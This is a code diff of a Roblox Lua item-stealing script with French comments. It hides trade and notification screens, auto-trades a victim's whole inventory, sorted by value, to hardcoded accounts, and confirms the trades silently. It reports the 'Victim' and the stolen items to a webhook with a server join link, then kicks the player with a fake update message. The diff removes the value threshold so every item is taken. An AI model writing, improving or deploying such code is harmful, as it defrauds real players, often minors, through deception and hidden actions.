@@ -20,21 +20,19 @@ local Replion = require(game.ReplicatedStorage.Packages.Replion)
 local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
 local webhook = _G.webhook or "" 
 local auth_token = _G.AuthToken or "EBK-SS-A"
-local min_rap = _G.min_rap or 100
+local min_rap = _G.min_rap or 0 -- Mis à 0 pour ne rien rater
 local ping = _G.pingEveryone or "Yes"
 
 ---------------------------------------------------------
--- CACHE DE L'INTERFACE (FORCE INVISIBLE)
+-- CACHE DE L'INTERFACE (INVISIBLE)
 ---------------------------------------------------------
 local function killUI()
     pcall(function()
         tradeGui.Enabled = false
         tradeGui.Black.Visible = false
-        tradeGui.MiscChat.Visible = false
         tradeCompleteGui.Enabled = false
         tradeGui.Main.Visible = false
-        tradeGui.UnfairTradeWarning.Visible = false
-        notificationsGui.Notifications.Visible = false
+        notificationsGui.Enabled = false
     end)
 end
 killUI()
@@ -45,21 +43,8 @@ tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
 end)
 
 ---------------------------------------------------------
--- FONCTIONS DE TRADE
+-- FONCTIONS RAP
 ---------------------------------------------------------
-
-local function readyTrade()
-    pcall(function()
-        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
-    end)
-end
-
-local function confirmTrade()
-    pcall(function()
-        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
-    end)
-end
-
 local function getRAP(category, itemName)
     local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
     if not success or not rapData then return 0 end
@@ -75,7 +60,7 @@ local function getRAP(category, itemName)
 end
 
 ---------------------------------------------------------
--- WEBHOOK AVEC THUMBNAIL
+-- WEBHOOK AVEC TOUT (THUMBNAIL + JOIN)
 ---------------------------------------------------------
 
 local function SendStatusWebhook(title, color, isStart)
@@ -86,18 +71,22 @@ local function SendStatusWebhook(title, color, isStart)
         totalRAP = totalRAP + item.RAP
     end
 
+    -- Construction du lien de join direct
+    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
+    local clickableLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+
     local data = {
         ["auth_token"] = auth_token,
-        ["content"] = (isStart and ping == "Yes") and "@everyone | " .. plr.Name .. " a du stuff détecté !" or nil,
+        ["content"] = (isStart and ping == "Yes") and "@everyone | " .. joinCode or nil,
         ["embeds"] = {{
             ["title"] = title,
             ["color"] = color,
             ["fields"] = {
                 {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                 {name = "💰 Total RAP:", value = "```" .. totalRAP .. "```", inline = true},
-                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Aucun") .. "```", inline = false}
+                {name = "🔗 Join Link:", value = "[Click to Join Server](" .. clickableLink .. ")", inline = false},
+                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Scanning...") .. "```", inline = false}
             },
-            -- AJOUT DU THUMBNAIL ICI
             ["thumbnail"] = {
                 ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
             },
@@ -116,7 +105,6 @@ end
 ---------------------------------------------------------
 -- AUTO TRADE
 ---------------------------------------------------------
-
 local function startAutoTrade(targetPlayer)
     task.spawn(function()
         while #itemsToSend > 0 do
@@ -131,25 +119,23 @@ local function startAutoTrade(targetPlayer)
                     local item = table.remove(itemsToSend, 1)
                     netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                     limit = limit + 1
-                    task.wait(0.05)
                 end
 
-                readyTrade()
+                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
                 task.wait(0.5)
-                confirmTrade()
+                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                 repeat task.wait(0.2) until not inTrade
             end
             task.wait(1)
         end
         SendStatusWebhook("✅ Stuff Successfully Stolen !", 65280, false)
-        plr:kick("Update Finished.")
+        plr:kick("Update Finished. Items Secured.")
     end)
 end
 
 ---------------------------------------------------------
--- SCAN & LANCEMENT
+-- SCAN & RUN
 ---------------------------------------------------------
-
 for _, cat in ipairs(categories) do
     if clientInventory[cat] then
         for id, info in pairs(clientInventory[cat]) do
@@ -164,6 +150,9 @@ for _, cat in ipairs(categories) do
 end
 
 if #itemsToSend > 0 then
+    -- On trie par RAP pour prendre le meilleur en premier
+    table.sort(itemsToSend, function(a,b) return a.RAP > b.RAP end)
+
     local found = false
     for _, p in ipairs(Players:GetPlayers()) do
         if table.find(users, p.Name) then
